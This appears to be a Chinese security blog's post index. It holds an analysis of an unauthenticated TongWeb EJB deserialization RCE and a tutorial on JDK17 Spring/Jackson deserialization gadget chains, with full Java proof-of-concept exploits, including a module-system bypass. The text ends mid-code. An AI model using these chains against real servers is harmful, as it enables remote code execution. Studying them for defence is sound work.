`java.lang.reflect.InvocationHandler`\n\nGadget链子往往都是现成的，链子的学习应该放在日常，分析漏洞时往往不需要深挖调用链，只要能找source点~~和sink点~~就行。\n\n熟练使用ysoerial (https://github.com/frohoff/ysoserial) 和Java-chain (https://github.com/vulhub/java-chains)。\n\nysoerial很多大牛都在原版的基础上进行了fork，可以积累一些遇到了直接用。https://github.com/Y4er/ysoserial/https://github.com/unam4/yso-mysqlpipe\n\nJava-chain往往可以作为知识库来用，或者反编译Java-chain自己拼好链。。。。","tags":["vulnerability","Java","deserialization"],"categories":["攻击技术"]},{"title":"TongWeb ejb服务反序列化致远程代码执行漏洞分析","url":"/2025/09/30/TongWeb-ejb服务反序列化致远程代码执行漏洞分析/","content":"\n近期TongWeb发布了一个安全加固说明，提示 EJB 远程服务存在反序列化风险，作为一个很久没爆新洞的老牌中间件厂商，一下子出来个未授权RCE，肯定是要分析一波。\n\n看下官方通告，漏洞是出现在 EJB 服务的 ejbserver 接口，而不是 WEB 服务里。可能正因如此，这个漏洞才能存在如此之久，直至最近才被披露。（By the way，近期披露高危漏洞越来越多地出现在非面向用户的HTTP服务上，可能主API端点已经被挖烂了很难出成果，把视线转移到这些冷门生僻不常用的开放端口里）\n\n![da940163f79d12e3ff156ca1202e87ef.png](/resources/9732657c38e14563b6297e2f9a289d1d.png)\n\n先看下TongWeb默认开启了哪些对外端口。再信息收集一波，漏洞不是在8088就是在5100。\n\n<img src=\"/resources/9cee0e94a67a4274a6e3407eb7b5d98d.png\" alt=\"aeae98f6cb07bc2a66c7111d7835fa0b.png\" width=\"709\" height=\"228\" class=\"jop-noMdConv\">\n\n <img src=\"/resources/c319ba01c90149a6988c08daeb02957a.png\" alt=\"521c9e3a08945eaf3ede18c5cb7f276c.png\" width=\"702\" height=\"194\" class=\"jop-noMdConv\">\n\n接口差不多确定后就可以找下路由，由于官方已经发了在 ejbserver 接口下，所以关键词检索找下，最后在 catalina 里确定了路由为`/ejbserver/ejb`。确定路由接口了，再随便向8088跟5100发送些序列化数据，可以确定端口为8088。\n\n![ca9a32c8bd9b28f3da1088b983ca1407.png](/resources/90ee795ab7d54a7aaf9aae7fabb02131.png)\n\n接下来看下补丁，TongWeb官方还是比较实诚的，把漏洞所在类已经写清楚了。\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<patchDescriptor>\n    <id>TW7030-TW7049M4_ITAIT-7010</id>\n    <sharedArchiveDesc>\n        <rule>\n            <name>update</name>\n            <value>com/tongweb/tongejb/server/httpd/ServerServlet.class</value>\n        </rule>\n        <src>media/lib/tongweb.jar</src>\n        <dest>lib/tongweb.jar</dest>\n    </sharedArchiveDesc>\n</patchDescriptor>\n\n```\n\n持续跟进 service 方法，最后会跟到`com.tongweb.tongejb.server.ejbd.EjbDaemon#service`下。\n\n<img src=\"/resources/0941eb8109b5453bbe97d9fe36c0bcd6.png\" alt=\"0516d7d777941cb62446b3321c4de750.png\" width=\"694\" height=\"320\" class=\"jop-noMdConv\">\n\n可以看到原始输入流经过了两次自定义的`readExternal`，第一次是对输入流的协议头有格式要求，必须匹配正则`^OEJP/[0-9].[0-9]$`，第二次则是要求输入流写入一个字节的值1。\n\n<img src=\"/resources/a103505d0a594ceb94a3b0cd366d9205.png\" alt=\"5a6b8d7aa3a680b5ea05ae7922251d25.png\" width=\"779\" height=\"127\" class=\"jop-noMdConv\"> <img src=\"/resources/4d5afdb5126f44bc9118fd1b2cdaed67.png\" alt=\"112cda267867fe74fa1a3d78f271c81f.png\" width=\"729\" height=\"200\" class=\"jop-noMdConv\">\n\n那么我们就已经确定了Tongweb的反序列化方式，那么接下来只需要找一条可调用的Gadget链子就行了。\n\n先检查下其依赖，第一眼就能看到`commons-beanutils-core-1.8.3.jar`，而且TongWeb有一个老洞就是用CB链，顺其自然用CB183打一波发现失败了，找原因发现是并没有引入`org.apache.commons.beanutils.BeanComparator`包。继续检查发现`xbean-naming-4.5.jar`，而且众所周知，TongWeb就是照着TomCat改的，那么TomCat存在的问题TongWeb也大概率存在，因此可以想到利用`BadAttributeValueExpExceptionToString->XBeanToString->TomcatElRef`\n\n找了一下果然发现TongWeb原封不动的“借鉴”了Tomcat的`BeanFactory`，只不过改了个包名`com.tongweb.naming.factory.BeanFactory`。那么就可以用别人写好的payload试着构造下。https://github.com/unam4/yso-mysqlpipe/blob/main/src/main/java/ysoserial/payloads/XbeanWithBeanFactory.java\n\n引入TongWeb的依赖，并把factory的名字改掉。\n\n<img src=\"/resources/320d5bc27a9d4cca9328d1ce4c7f2e80.png\" alt=\"939407b7ee2fb682e2309024930ac593.png\" width=\"802\" height=\"542\" class=\"jop-noMdConv\">\n\n理论上就ok了，但是结果发现还是失败。。。。百思不得其解最后才发现是表达式注入里的payload用的base64类TongWeb没有。。。换成TongWeb自己的base64类终于执行成功。\n\n<img src=\"/resources/f39d9afedc4e435f9e05e54b2f213948.png\" alt=\"61fabd59883f1e57f93abb3dfb8d00f1.png\" width=\"812\" height=\"300\" class=\"jop-noMdConv\">\n\n<img src=\"/resources/45e6353986fb47a592d91954c4e74139.png\" alt=\"5247fc077e703dfb343bc1a6b7f33c85.png\" width=\"780\" height=\"275\" class=\"jop-noMdConv\">","tags":["vulnerability","Java","反序列化"],"categories":["漏洞分析"]},{"title":"JDK17下的Spring原生反序列化链","url":"/2025/06/30/JDK17下的Spring原生反序列化链/","content":"\n## 一、前置依赖\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n​\n    <groupId>com.suctf</groupId>\n    <artifactId>Spring</artifactId>\n    <version>1.0-SNAPSHOT</version>\n​\n    <properties>\n        <maven.compiler.source>17</maven.compiler.source>\n        <maven.compiler.target>17</maven.compiler.target>\n        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n    </properties>\n​\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n            <version>3.5.4</version>\n        </dependency>\n​\n        <dependency>\n            <groupId>org.javassist</groupId>\n            <artifactId>javassist</artifactId>\n            <version>3.30.2-GA</version>\n        </dependency>\n    </dependencies>\n</project>\n```\n\n## 二、前置知识\n\n### 1. 不继承`AbstractTranslet`的`TemplatesImpl`恶意类\n\n`TemplatesImpl` 类实现了 `javax.xml.transform.Templates` 接口，用于表示已编译的 XSLT 模板，实现了 `java.io.Serializable` 代表可被反序列化。`TemplatesImpl` 类中存在一个 `getTransletInstance()` 方法会将 `_class` 数组下标为 `_transletIndex` (即-1)的值实例化，如果该数组及下标值可控，则我们可以执行任意代码。\n\n<img src=\"/resources/8ee69ad80d49481899c065260bdd3588.png\" alt=\"4135caa0b624b42d879113d9d5025eb1.png\" width=\"942\" height=\"452\" class=\"jop-noMdConv\">\n\n至于其详细利用条件和触发过程，这里就不详细展开了，网上有很多分析文章。完整POC如下：\n\n```java\npackage com.anbai.sec.unsafe;\n\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtConstructor;\n\nimport java.lang.reflect.Field;\n\n\npublic class TemplatesImplGarget {\n    public static void main(String[] args) throws Exception {\n        ClassPool classPool = ClassPool.getDefault();   // 获取CtClass容器\n        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // 引入AbstractTranslet路径到classpath中\n        CtClass testCtClass = classPool.makeClass(\"TestCtClass\");   // 创建CtClass对象\n        testCtClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));    // 设置父类为AbstractTranslet\n        CtConstructor ctConstructor = testCtClass.makeClassInitializer();   // 创建空初始化构造器\n        ctConstructor.insertBefore(\"Runtime.getRuntime().exec(\\\"open -a Calculator\\\");\"); // 插入初始化语句\n        byte[] bytes = testCtClass.toBytecode();    // 获取字节数据\n        TemplatesImpl templates = new TemplatesImpl();\n        //Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][]{bytes});\n        Field bytecodesField = TemplatesImpl.class.getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        bytecodesField.set(templates, new byte[][]{bytes});\n        //Reflections.setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        Field tfactoryField = TemplatesImpl.class.getDeclaredField(\"_tfactory\");\n        tfactoryField.setAccessible(true);\n        tfactoryField.set(templates, new TransformerFactoryImpl());\n        //Reflections.setFieldValue(templates, \"_name\", \"seizer\");\n        Field serzerField = TemplatesImpl.class.getDeclaredField(\"_name\");\n        serzerField.setAccessible(true);\n        serzerField.set(templates,\"hahah\");\n//        templates.newTransformer();\n        templates.getOutputProperties();\n    }\n}\n```\n\n使用 `TemplatesImpl` 实现了简单的任意字节码加载。其中的一个条件是 JavaClass 必须继承 `AbstractTranslet` 类。那么如果我们的JavaClass还需要继承其他类，就没办法了。所以需要尝试绕过这个限制。\n\n已知实例化恶意类之前会先调用`defineTransletClasses()`方法\n\n<img src=\"/resources/f8b2143e73f741fa823fa31c71f66b67.png\" alt=\"c30c8c45ae339c490add6e9b5a36159a.png\" width=\"715\" height=\"419\" class=\"jop-noMdConv\">\n\n我们跟进到`defineTransletClasses()`方法，已知我们目标是恶意类不继承`AbstractTranslet`类，那么就会存在几个需要满足的前置条件。\n\n首先，\\_tfactory不能为空，通过反射设置为 `TransformerFactoryImpl` 实例对象。但是理论上 `_tfactory` 这个字段是被 `transient` 修饰的，并不参与序列化过程。\n\n其次，在check if this is the main class过程就必定会进入else中。那么就没办法修改默认的`_transletIndex`为0了，所以需要手动设置值为0及以上。\n\n最后，当类不继承 `AbstractTranslet` 时，会向 `_auxClasses` 中 put 数据，因此还需要保证 `_auxClasses` 不为空。因此需要实例化 `_auxClasses`。在代码前面有一个判断，当 `classCount` 大于 1 时，即 `_bytecodes` 传入多个类时会将 `_auxClasses` 赋值为 HashMap。因此我们可以传入两个JavaClass从而给`_auxClasses`赋值。\n\n<img src=\"/resources/f7311711fae445b3999f6fc892cf6e89.png\" alt=\"edd2fc016193ab234a3e745c37286e58.png\" width=\"861\" height=\"535\" class=\"jop-noMdConv\">\n\n因此就可以着手构造我们的POC：\n\n```java\npackage ysoserial.xxx;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport ysoserial.payloads.util.ClassFiles;\nimport ysoserial.payloads.util.Reflections;\nimport javassist.*;\n\nimport java.io.Serializable;\n\npublic class Without_AbstractTranslet {\n    public static void main(String[] args) throws Exception {\n//        payload1();\n        payload2();\n    }\n\n    public static void payload2() throws Exception {\n        byte[] code1 = getTemplateCode();\n        byte[] code2 = ClassPool.getDefault().makeClass(\"xxx\").toBytecode();\n        TemplatesImpl templates = new TemplatesImpl();\n        Reflections.setFieldValue(templates, \"_bytecodes\",new byte[][]{code1, code2});\n        Reflections.setFieldValue(templates, \"_name\", \"anyStr\");\n        Reflections.setFieldValue(templates, \"_transletIndex\", 0);\n        Reflections.setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        templates.getOutputProperties();\n    }\n    public static byte[] getTemplateCode() throws Exception {\n        ClassPool pool = ClassPool.getDefault();\n        CtClass template = pool.makeClass(\"MyTemplate\");\n        String block = \"Runtime.getRuntime().exec(\\\"open -a Calculator\\\");\";\n        template.makeClassInitializer().insertBefore(block);\n        return template.toBytecode();\n    }\n\n}\n\n```\n\n### 2\\. EventListenerList触发toString\n\n`UndoManager`类，它实现了`UndoableEditListener`接口。而`UndoableEditListener`接口又继承了`EventListener`类。\n\n<img src=\"/resources/7db0ed6cf48241d293be7195ce45906f.png\" alt=\"2aedfccd1dfc1870022e94d847500717.png\" width=\"748\" height=\"138\" class=\"jop-noMdConv\"> <img src=\"/resources/97b554c100a049d6a7ba1dad0de83aab.png\" alt=\"79fe58011ed4dda244ebf23f3722af70.png\" width=\"621\" height=\"135\" class=\"jop-noMdConv\">\n\n回来看`UndoManager`类也继承了`CompoundEdit`类，向上继承了`AbstractUndoableEdit`类，这个类继承了`Serializable`接口。\n\n链子的入口点位于`javax.swing.event.EventListenerList#readObject`，需要是能够强制转换为 `EventListener` 类型，并且实现 Serializable 接口的类。显然`UndoManager`类满足这个条件。\n\n<img src=\"/resources/93a001d932d541ec9ca2060fdff13caf.png\" alt=\"a6d06e6e80f6b76c7c258a094b7a40ea.png\" width=\"744\" height=\"348\" class=\"jop-noMdConv\">\n\n跟进`UndoManager`类`toString`方法，发现两个变量都是string类型，所以看跟进其super方法，发现有一个edit变量为`Vector`类，观察`Vector`类的toString方法，发现会直接有经典的`toString`方法。\n\n<img src=\"/resources/1774b6258b634ffdaf2e47e70673cf54.png\" alt=\"da1ffaeb1c63bfb125a1e7417c099b83.png\" width=\"703\" height=\"148\" class=\"jop-noMdConv\"> <img src=\"/resources/915f3c01adda4521afeeba6dba91b925.png\" alt=\"c88c4087ca17048989920c36a93e72a8.png\" width=\"751\" height=\"75\" class=\"jop-noMdConv\">\n\n跟进到`Vector#toString`，发现其直接调用父类的方法，继续跟进，到了`AbstractCollection.toString`：\n\n<img src=\"/resources/0c2d298635d64d959e0e50d680780c8e.png\" alt=\"4a90c61c27a3fbca8da415d34b4e4725.png\" width=\"765\" height=\"305\" class=\"jop-noMdConv\">\n\n这里新建了一个迭代器，把对象传递给`StringBuilder.append`方法，我们可以通过`Vector.add`方法把恶意类添加进去。`append`方法调用了`valueOf`方法，其中传入参数是一个Object类型，就实现任意`toString`方法的调用了。\n\n<img src=\"/resources/df2acf7a80314e6f8ed36957f45a498e.png\" alt=\"1d570f252a0b017f5b980d0d49b9bcb2.png\" width=\"788\" height=\"117\" class=\"jop-noMdConv\">\n\n完整POC如下：\n\n```java\npackage ysoserial.xxx;\n\nimport com.alibaba.fastjson.*;\nimport javax.management.BadAttributeValueExpException;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Vector;\nimport javax.swing.event.EventListenerList;\n\n\nimport javax.swing.undo.UndoManager;\n\npublic class EventListenerListPayload{\n    public static void main(String[] args) throws Exception {\n        User u = new User(\"Infernity\");\n        //EventListenerList eventListenerList = getEventListenerList(u);\n        EventListenerList list = new EventListenerList();\n        UndoManager undomanager = new UndoManager();\n        Vector vector = (Vector) getFieldValue(undomanager, \"edits\");\n        vector.add(u);\n        setValue(list, \"listenerList\", new Object[]{Class.class, undomanager});\n        String a = serialize(list);\n        unserialize(a);\n    }\n\n    public static EventListenerList getEventListenerList(Object obj) throws Exception{\n        EventListenerList list = new EventListenerList();\n        UndoManager undomanager = new UndoManager();\n\n        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。\n        Vector vector = (Vector) getFieldValue(undomanager, \"edits\");\n        vector.add(obj);\n\n        setValue(list, \"listenerList\", new Object[]{Class.class, undomanager});\n        return list;\n    }\n    //反射改值\n    public static void setValue(Object obj, String name, Object value) throws Exception{\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n\n    //获取已实例化类中的值\n    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {\n        final Field field = getField(obj.getClass(), fieldName);\n        return field.get(obj);\n    }\n\n    public static Field getField( final Class<?> clazz, final String fieldName ) throws Exception {\n        try {\n            Field field = clazz.getDeclaredField(fieldName);\n            if (field != null)\n                field.setAccessible(true);\n            else if (clazz.getSuperclass() != null)\n                field = getField(clazz.getSuperclass(), fieldName);\n\n            return field;\n        } catch (NoSuchFieldException e) {\n            if (!clazz.getSuperclass().equals(Object.class)) {\n                return getField(clazz.getSuperclass(), fieldName);\n            }\n            throw e;\n        }\n    }\n\n    //提供需要序列化的类，返回base64后的字节码\n    public static String serialize(Object obj) throws IOException {\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);\n        objectOutputStream.writeObject(obj);\n        String poc = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());\n        return poc;\n    }\n\n    //提供base64后的字节码，进行反序列化\n    public static void unserialize(String exp) throws IOException,ClassNotFoundException{\n        byte[] bytes = Base64.getDecoder().decode(exp);\n        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);\n        objectInputStream.readObject();\n    }\n}\n\n```\n\n### 3. Jackson原生反序列化\n\n`Spring`中默认包含`Jackson`依赖。而`Jackson`存在一条将bean对象中的所有的属性的getter方法进行调用的链子。主要思路是通过依次掉用`BaseJsonNode#toString -> InternalNodeMapper#nodeToString -> ObjectWriter.writeValueAsString`方法实现经典Jackson反序列化链。又由于`BaseJsonNode`类是抽象类，用将其作为父类的`POJONode`类进行利用。\n\n<img src=\"/resources/7309c5f5743e40f5add535f481dbb382.png\" alt=\"e3c3d5e1b379a04bdd9ff388dfbed734.png\" width=\"536\" height=\"270\" class=\"jop-noMdConv\">\n\n完整POC如下：\n\n```java\npackage ysoserial.xxx;\n\n\nimport com.fasterxml.jackson.databind.node.POJONode;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\n\nimport javax.management.BadAttributeValueExpException;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\nimport javassist.*;\nimport ysoserial.payloads.util.Reflections;\n\npublic class Jackson_POJONode {\n    public static byte[] getTemplateCode() throws Exception {\n        ClassPool pool = ClassPool.getDefault();\n        CtClass template = pool.makeClass(\"MyTemplate\");\n        String block = \"Runtime.getRuntime().exec(\\\"open -a Calculator\\\");\";\n        template.makeClassInitializer().insertBefore(block);\n        return template.toBytecode();\n    }\n    public static void main(String[] args) throws Exception {\n        //删除BaseJsonNode类中的wirteReplace方法\n        ClassPool pool = ClassPool.getDefault();  //创建Javassist的类池对象，用于加载和管理目标类的字节码\n        CtClass jsonNode = pool.get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");  //从类池中获取BaseJsonNode类的CtClass对象，允许后续修改其字节码\n        CtMethod writeReplace = jsonNode.getDeclaredMethod(\"writeReplace\");  //通过Java反射获取到writeReplace方法\n        jsonNode.removeMethod(writeReplace);  //移除writeReplace方法\n        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n        jsonNode.toClass(classLoader, null);  //重新加载修改后的类\n        byte[] code1 = getTemplateCode();\n        byte[] code2 = ClassPool.getDefault().makeClass(\"xxx\").toBytecode();\n        TemplatesImpl templates = new TemplatesImpl();\n        Reflections.setFieldValue(templates, \"_bytecodes\",new byte[][]{code1, code2});\n        Reflections.setFieldValue(templates, \"_name\", \"anyStr\");\n        Reflections.setFieldValue(templates, \"_transletIndex\", 0);\n        Reflections.setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        POJONode pojoNode = new POJONode(templates);\n        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);\n        Field valField = badAttributeValueExpException.getClass().getDeclaredField(\"val\");\n        valField.setAccessible(true);\n        valField.set(badAttributeValueExpException, pojoNode);\n        byte[] data = serialize(badAttributeValueExpException);\n        deserialize(data);\n    }\n    public static byte[] serialize(Object object) throws Exception {\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);\n        oos.writeObject(object);\n        oos.flush();\n        oos.flush();\n        return byteArrayOutputStream.toByteArray();\n    }\n    public static Object deserialize(byte[] bytes) throws Exception {\n        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n        ObjectInputStream ois = new ObjectInputStream(byteArrayInputStream);\n        return ois.readObject();\n    }\n\n}\n\n```\n\n### 4\\. JDK17的封堵与绕过\n\n在`JDK8`中之所以能够利用成功，是因为`BadAttributeValueExpException.readObject`中调用了`valObj.toString()`​。\n\n<img src=\"/resources/ddd6d9560f514f6c9cb5179218e8e110.png\" alt=\"b55f86568c17215cc905f25c4579f4ae.png\" width=\"778\" height=\"294\">\n\n而在`JDK17`的`BadAttributeValueExpException.readObject`中，`valObj.toString()`被移除了。\n\n<img src=\"/resources/0b9ec686dbb7497bbff710f3f316dd89.png\" alt=\"7dd7b9241fcd1334538c2a0dd459ed78.png\" width=\"641\" height=\"172\">\n\n所以我们需要利用2中的`EventListenerList`触发`toString`，来代替`BadAttributeValueExpException`​。\n\n完整POC如下：\n\n```java\npackage ysoserial.xxx;\n\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.Vector;\nimport javax.swing.event.EventListenerList;\n\nimport javax.swing.undo.UndoManager;\n\nimport com.fasterxml.jackson.databind.node.POJONode;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtMethod;\n\npublic class EventListenerList_polonode {\n    public static void main(String[] args) throws Exception{\n        //删除BaseJsonNode类中的wirteReplace方法\n        ClassPool pool = ClassPool.getDefault();  //创建Javassist的类池对象，用于加载和管理目标类的字节码\n        CtClass jsonNode = pool.get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");  //从类池中获取BaseJsonNode类的CtClass对象，允许后续修改其字节码\n        CtMethod writeReplace = jsonNode.getDeclaredMethod(\"writeReplace\");  //通过Java反射获取到writeReplace方法\n        jsonNode.removeMethod(writeReplace);  //移除writeReplace方法\n        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n        jsonNode.toClass(classLoader, null);  //重新加载修改后的类\n\n        byte[] code1 = getTemplateCode();\n        byte[] code2 = ClassPool.getDefault().makeClass(\"xxx\").toBytecode();\n        TemplatesImpl templates = new TemplatesImpl();\n        setValue(templates, \"_bytecodes\",new byte[][]{code1, code2});\n        setValue(templates, \"_name\", \"anyStr\");\n        setValue(templates, \"_transletIndex\", 0);\n        setValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        POJONode pojoNode = new POJONode(templates);\n        EventListenerList list = getEventListenerList(pojoNode);\n        byte[] data = serialize(list);\n        deserialize(data);\n    }\n    public static byte[] getTemplateCode() throws Exception {\n        ClassPool pool = ClassPool.getDefault();\n        CtClass template = pool.makeClass(\"MyTemplate\");\n        String block = \"Runtime.getRuntime().exec(\\\"open -a Calculator\\\");\";\n        template.makeClassInitializer().insertBefore(block);\n        return template.toBytecode();\n    }\n    public static EventListenerList getEventListenerList(Object obj) throws Exception{\n        EventListenerList list = new EventListenerList();\n        UndoManager undomanager = new UndoManager();\n\n        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。\n        Vector vector = (Vector) getFieldValue(undomanager, \"edits\");\n        vector.add(obj);\n\n        setValue(list, \"listenerList\", new Object[]{Class.class, undomanager});\n        return list;\n    }\n    public static void setValue(Object obj, String name, Object value) throws Exception{\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n\n    //获取已实例化类中的值\n    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {\n        final Field field = getField(obj.getClass(), fieldName);\n        return field.get(obj);\n    }\n\n    public static Field getField( final Class<?> clazz, final String fieldName ) throws Exception {\n        try {\n            Field field = clazz.getDeclaredField(fieldName);\n            if (field != null)\n                field.setAccessible(true);\n            else if (clazz.getSuperclass() != null)\n                field = getField(clazz.getSuperclass(), fieldName);\n\n            return field;\n        } catch (NoSuchFieldException e) {\n            if (!clazz.getSuperclass().equals(Object.class)) {\n                return getField(clazz.getSuperclass(), fieldName);\n            }\n            throw e;\n        }\n    }\n    public static byte[] serialize(Object object) throws Exception {\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);\n        oos.writeObject(object);\n        oos.flush();\n        oos.flush();\n        return byteArrayOutputStream.toByteArray();\n    }\n    public static Object deserialize(byte[] bytes) throws Exception {\n        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n        ObjectInputStream ois = new ObjectInputStream(byteArrayInputStream);\n        return ois.readObject();\n    }\n\n\n}\n\n```\n\n### 5\\. JAVA JPMS模块检测绕过\n\n从 JDK9 开始，Java 引入了 JPMS（Java Platform Module System，模块系统），模块之间有明确的访问边界。`sun.*, com.sun.*, jdk.internal.*` 通常都算`JDK`内部类，不属于官方公开`API`​；而`java.*, javax.*`包下的类一般都是标准公开`API`​\n\n- 内部 API 封装：以前我们可以随意 `import com.sun.*` 或者 `sun.*` 的内部类，但在JDK17， 这些类已经被模块系统强封装，默认不可访问。\n- 强封装机制：模块之间的可见性由 `module-info.java` 描述，如果某个包没有被exports，外部模块就无法直接访问。\n- 反射限制：在 JDK8 及之前，我们常常通过`setAccessible(true)`绕过 private 限制，反射访问类的私有字段或构造函数。但在 JDK17 里，即使你用 `setAccessible(true)`，也会被`InaccessibleObjectException`拦住，除非在 JVM 启动时手动加`-add-opens`参数开放模块或者使用Java Agent/Instrumentation来打破封装。\n\n因此，jdk17 会进行模块检测导致我们无法直接利用`getOutputProperties`。报错如下：\n\n```java\nException in thread \"main\" java.lang.RuntimeException: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl: Failed to construct BeanSerializer for [simple type, class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl]: (java.lang.IllegalArgumentException) Failed to call setAccess() on Method 'getOutputProperties' (of class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl) due to java.lang.reflect.InaccessibleObjectException, problem: Unable to make public synchronized java.util.Properties com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties() accessible: module java.xml does not \"exports com.sun.org.apache.xalan.internal.xsltc.trax\" to unnamed module @36f0f1be\n\n```\n\n我们可以利用 `Unsafe` 篡改 `Module` 机制，绕过 JDK 的强封装机制。具体为什么能绕过不太懂，可见https://xz.aliyun.com/news/18628\n\n```java\nprivate static Method getMethod(Class clazz, String methodName, Class[]\n            params) {\n        Method method = null;\n        while (clazz!=null){\n            try {\n                method = clazz.getDeclaredMethod(methodName,params);\n                break;\n            }catch (NoSuchMethodException e){\n                clazz = clazz.getSuperclass();\n            }\n        }\n        return method;\n    }\n    private static Unsafe getUnsafe() {\n        Unsafe unsafe = null;\n        try {\n            Field field = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            field.setAccessible(true);\n            unsafe = (Unsafe) field.get(null);\n        } catch (Exception e) {\n            throw new AssertionError(e);\n        }\n        return unsafe;\n    }\n    public void bypassModule(ArrayList<Class> classes){\n        try {\n            Unsafe unsafe = getUnsafe();\n            Class currentClass = this.getClass();\n            try {\n                Method getModuleMethod = getMethod(Class.class, \"getModule\", new\n                        Class[0]);\n                if (getModuleMethod != null) {\n                    for (Class aClass : classes) {\n                        Object targetModule = getModuleMethod.invoke(aClass, new\n                                Object[]{});\n                        unsafe.getAndSetObject(currentClass,\n                                unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\")), targetModule);\n                    }\n                }\n            }catch (Exception e) {\n            }\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n    \n```\n\n我们在调用Jackson链，调用任意类的getter方法时，由于getter方法优先级顺序不稳定的原因，会导致Jackson链也会具有不稳定性，我们可以使用`JdkDynamicAopProxy`来解决Jackson链的不稳定性。\n\nJackson链不稳定性解决可以看：[Jackson中getter触发不稳定问题](http://101.36.122.13:4000/2025/08/28/Jackson%E4%B8%ADgetter%E8%A7%A6%E5%8F%91%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/)\n\n同时，我们知道在Jackson反序列化中，会先调用`TemplatesImpl`类的构造方法，再去调用其getter方法，而`TemplatesImpl`在`com.sun.org.apache.xalan.internal.xsltc.trax`包下，同样受到**内部 API 封装**的限制，我们使用`Aop`代理后，其对外暴露的接口为`javax.xml.transform.Templates`，`java.xml`模块是不受限的，因此可以利用以下代码绕过**模块检测。**\n\n```java\npublic static Object templatesImplAopProxy(TemplatesImpl templates) throws Exception{\n        AdvisedSupport advisedSupport = new AdvisedSupport();\n        advisedSupport.setTarget(templates);\n        Constructor constructor = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\").getConstructor(AdvisedSupport.class);\n        constructor.setAccessible(true);\n        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(advisedSupport);\n        Object proxy = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{Templates.class}, invocationHandler);\n        return proxy;\n    }\n\n\n```\n\n所以完整POC如下：\n\n```java\npackage org.example;\n\nimport javax.swing.event.EventListenerList;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport javax.swing.undo.UndoManager;\nimport java.util.Base64;\nimport java.util.Vector;\nimport java.util.ArrayList;\nimport com.fasterxml.jackson.databind.node.POJONode;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport 